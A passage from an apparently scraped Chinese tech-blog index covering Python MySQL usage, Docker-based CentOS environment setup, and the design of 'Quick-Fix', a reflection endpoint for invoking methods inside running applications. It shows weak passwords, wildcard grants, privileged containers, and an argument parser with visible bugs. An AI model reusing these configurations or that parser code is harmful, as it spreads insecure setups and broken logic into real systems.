cursor.rowcount) print(\"-------------- end to insert one record ----------------\\n\") # 查询db的使用方式 print(\"-------------- start to query one record ----------------\") cursor.execute(\"select * from user\") # 表示取得结果集下一行 data = cursor.fetchone() print(\"fetch result\", data) print(\"-------------- end to query one record ----------------\\n\") 4. 更新更新与删除其实和插入的步骤都一样，无非是sql语句不同罢了 1234567891011121314151617181920212223242526272829def updateDb(cursor, db): ''' 测试更新db的case :param cursor: :param db: :return: ''' # 开始更新db print(\"-------------- start to update one record ----------------\") cursor.execute(''' update user set isDeleted=1 where id=1 limit 1 ''') # 再未提交之前，查看结果 cursor.execute(''' select * from user where id=1 ''') data = cursor.fetchone() print(\"query before update res: \", data) # 提交执行 db.commit() # 查看提交之后的结果 cursor.execute(''' select * from user where id=1 ''') data = cursor.fetchone() print(\"query after update res: \", data) print(\"-------------- end to update one record ----------------\\n\") 5. 查询查询与前面最大的区别就是不在需要执行 db.commit() 这一行了，直接cursor.execute即可，why？因为mysql的MVVC快照读方式 对于查询，最主要的就是对返回结果的处理，有取一条，取多条，取所有的三种使用方式 12345678910111213141516171819202122232425262728def queryDb(cursor, db): ''' 查询db的使用case :param cursor: :param db: :return: ''' print(\"-------------- start to query records ----------------\") cursor.execute(''' select * from user limit 10 ''') # 取结果集合中的第一条数据 record = cursor.fetchone() print(\"record1:\", record) print(\"----split------\") # 取结果集合中的两条，然后依次打印 records = cursor.fetchmany(2) print(\"record2:\", records) print(\"----split------\") # 通过遍历方式，逐一获取所有的结果 for record in cursor.fetchall(): print(\"record:\", record) print(\"-------------- end to query records ----------------\\n\") 6. 关闭连接12345678def close(db): ''' 关闭数据库连接 :param db: :return: ''' # 关闭数据库连接 db.close() 7. 使用测试测试方式 123456db, cursor = register()for i in range(0, 11): insertDb(cursor, db)updateDb(cursor, db)queryDb(cursor, db)close(db) 输出结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107Database version : 5.7.22 -------------- start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to insert one record ----------------cursor.execute effect: 1-------------- end to insert one record ------------------------------ start to query one record ----------------fetch result (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')-------------- end to query one record ------------------------------ start to update one record ----------------query before update res: Nonequery after update res: None-------------- end to update one record ------------------------------ start to query records ----------------record1: (12, '一灰灰_1542431218', '123456', 0, '1542431218', '1542431218')----split------record2: ((13, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296'), (14, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296'))----split------record: (15, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')record: (16, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')record: (17, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')record: (18, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')record: (19, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')record: (20, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')record: (21, '一灰灰_1542431296', '123456', 0, '1542431296', '1542431296')-------------- end to query records ---------------- II. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/11/18/181118-Python之Mysql基本使用篇/"},{"title":"181207-Centos使用docker构建ecs环境","text":"本文主要介绍利用docker来构建一个java后端可用的开发运维环境 I. java环境搭建首先是jdk的安装，可以安装open-jdk，也可以从jdk官网下载jdk包进行配置，简单说明下两种使用方式 1. open-jdk安装基本安装过程如下 12345# 切换rootsu# 首先查看当前支持的jdk版本yum list | grep jdkyum install java-11-openjdk-devel.x86_64 java-11-openjdk.x86_64 -y 2. jdk包安装a. 获取包官网下载 12345678## 到官网找到对应的版本，获取下载地址wget http://download.oracle.com/otn-pub/java/jdk/8u171-b11/512cd62ec5174c3487ac17c61aaa89e8/jdk-8u171-linux-x64.tar.gz?AuthParam=1529400028_058a3f3fdf9c78aa6502a6e91edfb1d2## 解压tar -zxvf jdk-8u171-linux-x64.tar.gz?AuthParam=1529400028_058a3f3fdf9c78aa6502a6e91edfb1d2## 目录指定mv jdk-8u171-linux-x64 /usr/local/java/ 宿主机拷贝 1234# 拷贝docker cp jdk1.8.0_131.tar.gz 0e118346222c:/home/soft# 进入容器docker exec -it 0e118346222c /bin/bash b. 安装12345cd /usrmkdir javacp /home/softtar -zxvf jdk1.8.0_131.tar.gzrm jdk1.8.0_131.tar.gz c. 配置进入配置文件 vi /etc/profile 12345## 文件末尾添加export JAVA_HOME=/home/soft/jdk1.8.0_131export JRE_HOME=${JAVA_HOME}/jreexport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/libexport PATH=${JAVA_HOME}/bin:$PATH 应用并查看是否配置ok 123source /etc/profilejavajavac 3. 删除自带的openjdk如果希望删除自带的jdk，可以执行下面的命令查看安装的版本 1rpm -qa | grep java 然后执行 123yum remove java-11-openjdk-headless-debug# 或者执行rpm -e --nodeps java-11-openjdk-headless-debug-11.0.1.13-3.el7_6.x86_64 II. Maven配置maven的配置相对简单，下载好包之后，设置mvn的配置即可 1. 获取包下载maven包，推荐到官网下载，我这里是从宿主机拷贝 1docker cp maven-3.5.3.tar.gz 0e118346222c:/home/soft 2. 解压到docker中，解压并配置 12cd /home/softtar -zxvf maven-3.5.3.tar.gz 3. 配置设置配置文件 vi /etc/profile 12M2_HOME=/home/soft/maven-3.5.3export PATH=${M2_HOME}/bin:${PATH} 配置生效 source /etc/profile 并查看 1234567[root@0e118346222c maven-3.5.3]# mvn --versionApache Maven 3.5.3 (3383c37e1f9e9b3bc3df5050c29c8aff9f295297; 2018-02-24T19:49:05Z)Maven home: /home/soft/maven-3.5.3Java version: 1.8.0_131, vendor: Oracle CorporationJava home: /usr/java/jdk1.8.0_131/jreDefault locale: en_US, platform encoding: ANSI_X3.4-1968OS name: \"linux\", version: \"3.10.0-693.2.2.el7.x86_64\", arch: \"amd64\", family: \"unix\" III. tomcat安装tomcat的安装基本上就是解压个包的事情了 1234docker cp tomcat.tar.gz 0e118346222c:/home/softdocker exec -it 0e118346222c /bin/bashcd /home/softtar -zxvf tomcat.tar.gz IV. nginx安装1. 直接使用 yum 安装后面一个参数表示指定安装的位置 1yum install nginx --prefix=/home/soft/nginx 上面这种安装，在配置https时，会有问题，提示要安装ssl模块啥的，因此可以这么添加一下参数 1yum install nginx --prefix=/home/soft/nginx --with-http_stub_status_module --with-http_ssl_module 如果你是先执行了上面的步骤，后面发现需要安装ssl模块，要怎么办 ？ 操作如下： 12345671. 获取安装的nginx版本 `nginx -V`2. 获取对应的源码包 `wget http://nginx.org/download/nginx-1.12.0.tar.gz`3. 解压源码包 `tar -zxvf nginx-1.12.0.tar.gz`, 进入解压的目录4. 编译 `./configure --prefix=/app/soft/nginx --with-http_stub_status_module --with-http_ssl_module`5. `make` 6. 备份老的nginx `cp /app/soft/nginx/sbin/nginx cp /app/soft/nginx/sbin/nginx.bk`7. 拷贝新的nginx `cp sbin/nginx /app/soft/nginx/sbin/nginx` 2. 源码安装上面其实已经包含了源码安装的步骤，下面简单的列一下 12345678910安装之前，先安装依赖- yum install -y zlib zlib-devel gcc- yum install -y pcre pcre-devel- yum install -y openssl openssl-develwget http://nginx.org/download/nginx-1.12.0.tar.gztar -zxvf nginx-1.12.0.tar.gz; cd nginx-1.12.0./configure --prefix=/home/soft/nginx --with-http_stub_status_module --with-http_ssl_modulemake make install 3. 命令nginx 命令 12345# 启动/app/soft/nginx/sbin/nginx # 停止/app/soft/nginx/sbin/nginx -s stop 验证是否启动成功 1curl 'http://locahost' V. Redis安装redis的安装，可以直接根据yum简单的进行安装，也可以下载安装包 1. yum安装方式1yum install redis 后台启动redis方式： 12345678910111213# 设置redis.conf文件，开启后台启动vim /etc/redis.conf## 找到 daemonize no 这一行## 修改成yes，并保存daemonize yes## 启动redisredis-server /etc/redis.conf 查看redis启动是否正常 12# 查看进程号ps -ef | grep redis 客户端连接测试 12345redis-cli&gt; set test 123&gt; get test&gt; expire test 关闭redis 1redis-cli shutdown 2. 源码安装方式下载源码并编译 1234wget http://download.redis.io/releases/redis-5.0.2.tar.gztar -zxvf redis-5.0.2.tar.gzcd redis-5.0.2make 设置下redis的相关配置文件，假设我们约定将数据文件存放在 /home/data/redis 目录下，则配置需要如下修改 进入配置文件 redis.conf 1234567891011121314# 修改默认的端口号port 6868# 修改密码requirepass newPwd!# 设置进程文件pidfile /home/data/redis-6868/redis.pid# 设置日志文件logfile &quot;/home/data/redis-6868/log/redis.log&quot;# 设置数据文件dir /home/data/redis-6868/data 在启动redis之前，首先需要创建对应的目录 1234cd /home/datamkdir redis-6868cd redis-6868mkdir data log 开始启动redis并测试 123456cd /home/soft/redis-5.0.2/src/redis-server redis.conf# 测试连接src/redis-cli -p 6868auth newPwd! VI. Mysql环境安装这里采用最简单的方式进行安装mysql，需要关注的是后面的默认配置的修改 1. 安装12345# 添加源rpm -Uvh http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm# 安装yum install mysql mysql-server mysql-libs mysql-server 上面安装完毕之后，可以开始启动服务 1systemctl start mysqld 上面的命令在docker中执行时，会报错 1Failed to get D-Bus connection: Operation not permitted 可以如下操作 12345678910111213141516# 首先设置下密码passwd&gt; 输入密码 (yihui)# 退出容器exit# 保存docker镜像docker commit 0e118346222c yihui/centos# 再次启动镜像docker run --privileged -e \"container=docker\" -v /sys/fs/cgroup:/sys/fs/cgroup -ti yihui/centos /usr/sbin/init# 输入账号和密码4af0575c5181 login: rootPassword: (yihui) 上面搞定之后，就可以继续启动mysql了 如果登录需要密码时，如下确定 1234grep \"temporary password\" /var/log/mysqld.log## 输出如下# A temporary password is generated for root@localhost: WClOFXUqF4&amp;4 2. 配置修改a. 端口号修改默认的端口号为3306，如果需要修改端口号，则找到my.cnf文件，新加一个配置即可: 1234567vim /etc/my.cnf## 找到指定的位置，修改端口号[mysqld]port=3305datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sock 服务重启 1service mysqld restart 2. 密码修改使用set password 格式： 1mysql&gt; set password for 用户名@localhost = password(&apos;新密码&apos;); 例子： 1mysql&gt; set password for root@localhost = password('123'); update 方式 12345mysql&gt; use mysql; mysql&gt; update user set password=password('123') where user='root' and host='localhost'; mysql&gt; flush privileges; 添加用户 12alter user 'root'@'localhost' identified by 'test';create user 'test'@'%' IDENTIFIED BY 'test'; 授予权限 123# root 方式登录grant all PRIVILEGES on test.* to 'yihui'@'%' IDENTIFIED by 'test';flush privileges; VIII. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/12/07/181207-Centos使用docker构建ecs环境/"},{"title":"190102-Quick-Fix 从0到1构建一个应用内服务/数据访问订正工具包","text":"I. 背景说明 case1: 程序出bug了在我们的实际工作中，当我们遇到别人反馈代码出问题了吧，怎么返回的数据不对？ 当应用持续跑了一段时间之后，这个时候我们的第一个反应基本是确认能复现么？如果能复现，那么调用的姿势是不是对的？如果确认姿势没问题，那么就是请求参数不对了!!! 如果请求参数还没有问题，卧槽，这下完了，真可能有bug了，这下怎么办？ 接下来，一般的讨论是在测试环境复现一下，如果能复现，那么开启debug（或者远程debug），一行行调试，相信很快就能搞定了； 但是，最怕的就是但是，测试环境没法复现，至于线上环境才有问题，这下怎么搞？ case2: 缓存数据有问题另外一个场景就是为了提升服务性能，缓存基本上会被大量的使用在各个系统之间；有缓存，那么就会有缓存不一致的问题，如果缓存用的是外部的如(redis/memcache)之类的，那么缓存数据的查询和订正，就相对简单了；但是，如果我们使用了内存作为数据的缓存，比如（hashmap, guava)，这种时候，我想知道这个内存中的数据怎么办？我想修改这个内存的中的数据怎么办？ 3. 小结上面两个场景，归纳一下主要是两个问题 如何知道线上应用中，某个服务的方法的执行结果； 如何知道线上应用中，某些内存数据的结果 II. 方案设计为了解决上面抛出的两个问题，我们要怎么做呢？ 1. 设计如何访问应用中的方法、数据，首先想到的就是反射；通过反射来执行某个实例的方法，或者获取实例的属性值，并没有太多的难度，有问题的是如何做到无侵入，如何与外部通信，如何做到通用 首先我们需要注入一个EndPoint，用于实现应用于外界的通信，这个是一切开始的基本条件，Fixer的Endpoint负责接收外部请求，并将请求转发给内部的解析器，执行应用内服务访问，并将结果输出给外部使用者 上图给出了EndPoint的结构设计，因为目前的java应用，直接以jar方式跑的不太多了，更常见的是将服务跑在其他的容器中，比如我们常见的tomcat应用，Spring应用等；不同的容器，对外暴露的方式不一样，怎么样才可以做到在不同的容器中，进行优雅的支持呢？ 接下来请求到应用内之后，首先定位到访问的服务，其次则进行服务调用执行，其实现流程如下 2. 技术从上面的结构设计出发，找到这个项目实现的关键点，然后看下可以怎么实现 a. 服务定位如何通过传入的请求参数来定位需要执行的服务方法，一般来将，应用中提供的服务可以分为两种情况 以实例的形式提供服务 如Spring中以Bean的形式，一个Service就是一个Bean；我们可以借助Spring的ApplicationContext获取对应的bean 这种类型的服务，要求应用本身持有所有服务，然后我们可以通过这个ServiceHolder来定位具体的服务 一个类对应一个服务 这种常见的是静态类或者单例，这个是以ClassLoader维度进行区分的； 因此我们可以直接通过ClassLoader方式来加载对应的类 然后我们主要目标需要集中在第一种方式，不同的应用方式，获取ServiceHolder不一样，让我们自己去全部支持，显然是不太现实的，因此我们需要设计一个方案，让使用者，自己来根据应用中的ServiceHolder，来选择具体的Service方法 这种，就可以通过SPI机制来支持 b. EndPoint支持提供与外部的交互，最常见的方案就是暴露一个http接口，然后接收外部的请求；非web服务怎么办？也可以开一个socket走tcp通信，那么问题来了 对于web服务 直接在已有的web服务上新增一个端点，并加上权限控制？ 另开一个端口提供服务 对于非web服务 新开端口提供服务 所以再具体的实现中，我们需要考虑以下几点 如何复用已有的web服务？ 没有web服务时，自己怎么支持web服务？ 如何支持绑定端口的配置？ 当项目中引入了多种EndPoint支持方式时，怎么保证只有一个生效？ 针对上面的问题，具体实现时，会用到下面一些机制 引入优先级 通过SPI来实现自定义扩展 解析JVM参数，来获取对应的配置 III. 相关博文从设计到实现，下面博文分别进行详细介绍说明 … （待补齐） IV. 使用说明1. 依赖管理首先添加仓库，两种方式，一个是github的release版本的引入，优势是稳定；确定是更新及时问题； 123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;jitpack.io&lt;/id&gt; &lt;url&gt;https://jitpack.io&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 另一个是我个人的仓库 123456&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;yihui-maven-repo&lt;/id&gt; &lt;url&gt;https://raw.githubusercontent.com/liuyueyi/maven-repository/master/repository&lt;/url&gt; &lt;/repository&gt;&lt;/repositories&gt; 2. 引入依赖包根据实际的应用场景，引入对应的依赖包， a. 纯jar应用12345&lt;dependency&gt; &lt;groupId&gt;com.git.hui.fix&lt;/groupId&gt; &lt;artifactId&gt;fix-core&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt; 注意事项： fix-core 内置了一个http服务器，默认绑定端口号 9999, 可以通过jvm参数 -Dquick.fix.port 来覆盖 在应用的入口出，需要主动执行 FixEngine.instance(); 进行初始化 因为fix-core 只提供了静态类的ServerLoader, 对于实例的加载，需要业务方自己来实现 使用姿势如下： 1curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:9999/fixer/call -d '{\"service\": \"com.git.hui.fix.example.jar.server.CalculateServer\", \"method\": \"getCache\", \"params\": [\"init\"], \"type\":\"static\"}' 实例demo: jar-example b. 纯Spring应用如我是一个纯Spring应用，没有使用SpringMVC，可以引入 12345&lt;dependency&gt; &lt;groupId&gt;com.git.hui.fix&lt;/groupId&gt; &lt;artifactId&gt;spring-fixer&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt; 注意事项： spring-fixer提供了访问Spring容器内bean的服务方式，因此除了获取默认提供的静态类之外，还可以访问bean； 使用默认的http服务器，端口号为 9999, 通过jvm参数 -Dquick.fix.port 来覆盖 与前面不同，不需要主动调用FixEngine.instance() 内部提供bean的加载ServerLoader，可以直接通过beanName或者Bean的完整类名访问其内部方法/数据 使用姿势如下: 123456789# 执行bean的某个方法curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:8080/inject-fixer-endpoint/call -d '{\"service\": \"demoBean\", \"method\": \"randName\"}'# 查看bean的属性值curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:8080/inject-fixer-endpoint/call -d '{\"service\": \"demoBean\", \"field\": \"name\"}'# 执行bean的属性的某个方法curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:8080/inject-fixer-endpoint/call -d '{\"service\": \"demoBean\", \"field\": \"values\", \"method\":\"add\", \"params\": [\"autoInsertByQuickFixer!\"]}'# 测试静态类的静态成员的方法调用curl -X POST -H \"Content-Type:application/json\" http://127.0.0.1:9999/fixer/call -d '{\"service\": \"com.git.hui.fix.example.spring.server.StaticBean\", \"method\": \"getCache\", \"params\": [\"init\"], \"type\":\"static\"}' 实例demo: spring-example c. SpringMVC应用如是一个SpringMVC应用，可以引入 12345&lt;dependency&gt; &lt;groupId&gt;com.git.hui.fix&lt;/groupId&gt; &lt;artifactId&gt;spring-mvc-fixer&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt; 使用说明： 利用mvc本身提供的http服务，访问路径为/inject-fixer-endpoint/call； 因此需要做好安全校验 使用姿势&amp;实例： 使用和前面的类似 spring-mvc-example d. SpringCloud应用如果是一个SpringCloud服务，且开启了 actuator 应用监测，可以引入 12345&lt;dependency&gt; &lt;groupId&gt;com.git.hui.fix&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-fixer&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt;&lt;/dependency&gt; 使用说明： 将FixEndPoint端口集成在SpringCloud的Actuator中，因此在实际使用时，需要在配置中开启，设置参数 management.endpoints.web.exposure.include 访问路径为：/actuator/inject-fixer-endpoint/call， 前面的 actuator路径与应用监测配置的路径一致 使用姿势&amp;实例: spring-cloud-example V. 其他项目 https://github.com/liuyueyi/quick-fix 其他拒绝单机，欢迎start或者加好友支持 声明尽信书则不如，已上内容，一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 WeChat: 一灰/liuyueyi25 扫描关注公众号&amp;博客 打赏码 知识星球","link":"/hexblog/2019/01/02/190102-Quick-Fix-从0到1构建一个应用内服务-数据访问订正工具包/"},{"title":"190108-Quick-Fix 如何优雅的实现应用内外交互之接口设计篇","text":"如何实现应用内外交互，是Quick-Fix框架的核心之一，我们常见的应用有提供web服务的（如Spring应用），有进行大数据计算的（如Storm应用），有提供rpc的后台服务（如通过dubbo提供rpc的数据服务），有纯jar服务等；基本上我们可以划分为两类 应用本身，有一套健全的与外界交互的机制（这里不包括db/redis等数据的读写） 应用只关注自己的服务功能（接收数据，产生数据，保存数据），本身不与第三方的应用进行交互 针对上面这两种case，我们应该怎么来设计一套应用内外交互的方案，来实现接收外部请求，执行应用内部方法或访问应用内部数据，并返回结果的目的？ I. 交互规范设计因为不同的应用，与外部交互的方式不一样，我们希望最好能直接复用已有的通信机制来实现我们的需求；比如原来就提供了web服务，我们可以在原有的web服务的基础上，新增一个Controller来实现需求；如果应用本身是通过rpc进行通行的，且已经有了非常完善的rpc测试辅助工具，然后就希望可以直接在现在已有的rpc基础上，新增一个服务来实现应用内外交互；再如果我就是一个独立jar应用，我希望通过http方式与外界交互，所以最好框架本身就提供一种默认的交互方案 简单来讲，交互，不能写死，最好是有一个规范，具体想用哪个实现，可以交给实际使用方来选择和扩展 1. 请求参数确认内外交互，首要的就是确认交互的参数，确定需要哪些基本信息，可以达到我们的目的；以及结果怎么返回 在设计参数之前，再次明确一下我们的目的： 执行应用内某个方法 访问应用中数据 要实现上面的目的，我们需要些什么？ service: 用于定位访问的具体类 field: 用来定位应用中的数据 method: 需要执行的方法 params: 方法执行需要传入参数 所以我们的req接口如下 1234567891011121314151617181920212223242526272829303132333435363738@Data@NoArgsConstructor@AllArgsConstructorpublic class FixReqDTO implements Serializable { private static final long serialVersionUID = -151408688916877734L; /** * 调用的服务名，.class 结尾，则表示根据类型查找Spring容器中的Bean；否则表示传入的为beanName，通过name方式查找Spring容器中的Bean */ private String service; /** * type用来区分service传入的是bean还是静态类 * * 当type == static 时要求service传入对应的静态类完整包路径方式 */ private String type; /** * 需要执行的方法 */ private String method; /** * 非空：表示最终执行的是service这个bean中成员field的方法method * 空： 表示最终执行的是service这个bean提供的方法method */ private String field; /** * 请求参数，格式为 class#value, 如 * * - int#20 * - Integer#20 * - String#Hello World * - net.finbtc.component.model.TradePairDO#{\"pairId\": 120} */ private String[] params;} 2. 请求参数说明针对请求参数，进行解释 key 类型 解释 service String 需要执行的服务，可以是完成路径，可以是beanName field String 需要访问的服务内部成员属性，值为属性名；为空时，表示执行的服务的某个方法 method String 方法名，需要执行的方法；为空时，表示访问某个服务的成员属性值 type String 用来辅助service来定位具体执行的类，如static表示访问的是一个静态类；single表示访问的是单例 params 数组 请求参数，数组，可以不存在，格式为 类型#值，对于基本类型，可以省略类型的前缀包 单独看表，可能不太好理解，下面结合实例进行说明，为什么要这么设计 a. 静态类和实例的访问在第一篇的整体设计中，就提及到我们采用反射的方式来执行目标方法，因此拿到请求参数后，第一步就是获取执行的类，我们需要执行的是静态类还是实例，对于反射而言，这个差别可不小；因此我们就有了type字段，用来区分service的类型 type可以决定用哪个ServerLoader来加载传入的Service 比如在框架提供的两种service加载中，对type支持如下 value 说明 service取值 static 表示service传入的是一个静态类的包路径，我们需要访问的是静态类的成员或方法 service必须是类全路径 bean 或不传 或空字符串 表示service传入的是Spring的Bean（可以是beanName, 也可以是全路径），我们需要访问的是Spring中某个Bean的成员或方法 service可以穿beanName or 全路径 b. 方法执行目标方法的执行，可以分为两种，一个是直接访问某个服务or静态类的方法；另外一个是访问某个服务or静态类的成员属性的方法 上面两种有什么区别呢？ 第一种，通过传入参数，看返回结果，更常见的是为了确认方法的执行逻辑是否有问题 第二种，更多是查询或订正内存数据（应用内存数据，往往是以成员属性的方式存在） 所以field,method 这两个参数的组合，就是用来确认上面的两种场景的 case 组合方式 效果 case1 field 不传，或者field为空，method存在 相等于执行service的method方法 case2 field method都存在，且method为field对象可执行的方法 分步骤为先获取service中的field属性，然后执行field的method方法 c. 传参说明方法执行，不可避免的就是传参了，参数我们将分为三类 基本类型: int/long/char/boolean/float/double/byte 特殊类型: String/Class/BigDecimal/BigInteger 对象 接下来，我们约定下传参的规范 params 为数组 基本类型，传参格式如 int#value 要求 格式 示例 params 数组 [“asd”, “123”] 基本类型 类型#value ”int#123&quot;, &quot;long@12039123123&quot;, &quot;boolean#true&quot;, &quot;float#123.321&quot; BigDecimal BigDecimal#value BigDecimal#12.2 BigInteger BigInteger#value BigInteger#12 Class Class#类全路径 Class#com.git.hui.fix.example.jar.server.CalculateServer String String#Value 或 Value &quot;String#Hello&quot;, HelloWorld 对象 全路径#Json序列化对象 &quot;com.git.hui.fix.example.jar.server.DemoDO#{\\&quot;key\\&quot;:\\&quot;kkk\\&quot;, \\&quot;value\\&quot;:\\&quot;aaa11\\&quot;}&quot; 接下来给出以下具体的参数解析逻辑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/** * 根据传入的参数来解析为对应的do对象 * Created by @author yihui in 15:32 18/12/13. */public class ArgumentParser { private static final Object[] emptyArgs = new Object[]{}; public static Object[] parse(String[] args) { if (args == null || args.length == 0) { return emptyArgs; } Object[] result = new Object[args.length]; for (int i = 0; i &lt; args.length; i++) { result[i] = buildArgObj(args[i]); } return result; } private static Object buildArgObj(String arg) { String[] typeValue = arg.split(\"#\"); if (typeValue.length == 1) { // 没有 #，把参数当成String return arg; } else if (typeValue.length == 2) { // 标准的kv参数 return parseStrToObj(typeValue[0], typeValue[1]); } else { throw new IllegalInvokeArgumentException(\"Illegal invoke arg: \" + arg); } } private static Object parseStrToObj(String type, String value) { try { if (\"int\".equals(type) || \"Integer\".equals(type)) { return Integer.parseInt(value); } else if (\"long\".equals(type) || \"Long\".equals(type)) { return Long.parseLong(value); } else if (\"float\".equals(type) || \"Float\".equals(type)) { return Float.parseFloat(value); } else if (\"double\".equals(type) || \"Double\".equals(type)) { return Double.parseDouble(value); } else if (\"byte\".equals(type) || \"Character\".equals(type)) { return Byte.parseByte(value); } else if (\"boolean\".equals(type) || \"Boolean\".equals(type)) { return Boolean.parseBoolean(value); } else if (\"BigDecimal\".equals(type)) { return new BigDecimal(value); } else if (\"BigInteger\".equals(type)) { return new BigInteger(type); } else if (\"String\".equals(type)) { return value; } else if (\"Class\".equalsIgnoreCase(type)) { return ArgumentParser.class.getClassLoader().loadClass(type); } else { Class clz = ArgumentParser.class.getClassLoader().loadClass(type); return JSON.parseObject(value, clz); } } catch (Exception e) { throw new IllegalInvokeArgumentException( \"Pare Argument to Object Error! type: \" + type + \" value: \" + value, e); } }} II. 其他0. 项目 https://github.com/liuyueyi/quick-fix 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2019/01/08/190108-Quick-Fix-如何优雅的实现应用内外交互之接口设计篇/"},{"title":"181230-使用Java Socket实现一个http服务器","text":"作为一个java后端，提供http服务可以说是基本技能之一了，但是你真的了解http协议么？你知道知道如何手撸一个http服务器么？tomcat的底层是怎么支持http服务的呢？大名鼎鼎的Servlet又是什么东西呢，该怎么使用呢？ 在初学java时，socket编程是逃不掉的一章；虽然在实际业务项目中，使用这个的可能性基本为0，本篇博文将主要介绍如何使用socket来实现一个简单的http服务器功能，提供常见的get/post请求支持，并再此过程中了解下http协议 I. Http服务器从0到1既然我们的目标是借助socket来搭建http服务器，那么我们首先需要确认两点，一是如何使用socket；另一个则是http协议如何，怎么解析数据；下面分别进行说明 1. socket编程基础我们这里主要是利用ServerSocket来绑定端口，提供tcp服务，基本使用姿势也比较简单，一般套路如下 创建ServerSocket对象，绑定监听端口 通过accept()方法监听客户端请求 连接建立后，通过输入流读取客户端发送的请求信息 通过输出流向客户端发送乡音信息 关闭相关资源 对应的伪代码如下: 123456789101112ServerSocket serverSocket = new ServerSocket(port, ip)serverSocket.accept();// 接收请求数据socket.getInputStream();// 返回数据给请求方out = socket.getOutputStream()out.print(xxx)out.flush();;// 关闭连接socket.close() 2. http协议我们上面的ServerSocket走的是TCP协议，HTTP协议本身是在TCP协议之上的一层，对于我们创建http服务器而言，最需要关注的无非两点 请求的数据怎么按照http的协议解析出来 如何按照http协议，返回数据 所以我们需要知道数据格式的规范了 请求消息 响应消息 上面两张图，先有个直观映象，接下来开始抓重点 不管是请求消息还是相应消息，都可以划分为三部分，这就为我们后面的处理简化了很多 第一行：状态行 第二行到第一个空行：header（请求头/相应头) 